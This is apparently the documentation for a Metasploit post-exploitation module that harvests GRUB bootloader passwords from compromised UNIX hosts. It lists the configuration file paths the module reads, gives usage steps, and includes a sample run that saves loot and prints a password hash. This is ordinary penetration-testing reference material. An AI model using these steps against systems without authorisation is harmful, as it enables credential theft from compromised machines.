# Gather GRUB Passwords

Reads all passwords from GRUB configuration files on UNIX-like machines.

## Vulnerable Application

Any UNIX-like system with a `shell` or `meterpreter` session using GRUB.

## Verification Steps

  1. Get a `shell` or `meterpreter` session on some host.
  2. Do: ```use post/multi/gather/grub_creds```
  3. Do: ```set SESSION [SESSION_ID]```, replacing ```[SESSION_ID]``` with the
     session number you wish to run this one.
  4. Do: ```run```
  5. If the system has readable GRUB configuration files containing a password,
     they will be printed out.

## Options

**FILENAME**

A string that can be used to specify an additional file to check after the
usual places.

**VERBOSE**

A boolean that, when set, will provide more details on what is being checked.
_(Note: this option is defined elsewhere in metasploit, but this module can make
use of it.)_

## Scenarios

There are many places where a user might place the password that GRUB uses, so
inserting a password line into any of these locations will work without any
additional configuration:

```
   /boot/grub/grub.conf
   /boot/grub/grub.cfg
   /boot/grub/menu.lst
   /boot/grub2/grub.cfg
   /boot/grub2/user.cfg
   /etc/grub.conf
   /etc/grub.d/*
   /etc/grub/grub.cfg
   /mnt/sysimage/boot/grub.conf
   /mnt/boot/grub/grub.conf
   /rpool/boot/grub/grub.cfg
```


Using a Metasploitable 2 VM (running Ubuntu 8.04), you can add the line
`password topscret` to `/boot/grub/menu.lst` to easily see this module in
action.

### Meterpreter

Typical run against Ubuntu 18.04 LTS

  ```
msf5 exploit(handler) > use post/multi/gather/grub_creds
msf5 post(grub_creds) > set SESSION 1
SESSION => 1
msf post(grub_creds) > run

[*] Searching for GRUB config files..
[*] Reading /boot/grub/grub.cfg
[*] Reading /etc/grub.d/40_custom
[*] Reading /etc/grub.d/00_header
[*] Reading /etc/grub.d/20_linux_xen
[*] Reading /etc/grub.d/10_linux
[*] Reading /etc/grub.d/README
[*] Reading /etc/grub.d/01_users
[+] /etc/grub.d/01_users saved to /home/bcook/.msf4/loot/20191029041304_default_127.0.0.1_grub.config_755243.txt
[*] Reading /etc/grub.d/41_custom
[*] Reading /etc/grub.d/30_os-prober
[*] Reading /etc/grub.d/05_debian_theme
[*] Reading /etc/grub.d/30_uefi-firmware
[+] Found credentials

Grub Credential Table
=====================

 Username             Password
 --------             --------
 putyourusernamehere  grub.pbkdf2.sha512.10000.CB9E1ED1050D0AFBC6EC3B75413FB288AD255B960C6DBA31C00A03AC286847DF8B1DEE167ED54316FD62EEAFE4A617959F90249849FBCB562AC27E68A6D59F90.E6AB5AE4B5E4EF375218A620A798002F5B38EE5F31B549A66AF5533A7931419BAC30E2305A95113F60BE116C9F3FE22126FE7768D095DE6B9BCDC55632400B52
  ```
```

